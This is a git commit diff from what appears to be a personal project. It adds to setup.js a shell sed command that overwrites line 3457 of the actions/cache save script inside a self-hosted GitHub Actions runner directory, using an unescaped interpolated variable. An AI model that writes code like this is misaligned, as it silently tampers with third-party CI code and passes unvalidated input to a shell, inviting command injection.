b61e9639fffa0d3498217bf07d7b5c0adb06f1cc
musset0 <musset025@gmail.com>
2023-08-24 00:26:49 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -90,6 +90,15 @@ cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actio
     console.log(`stderr: ${stderr}`);
 });
 
+cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+    if (err){
+        console.log(err);
+        return;
+    }
+    console.log(`stdout: ${stdout.toString()}`);
+    console.log(`stderr: ${stderr}`);
+});
+
 
 
 
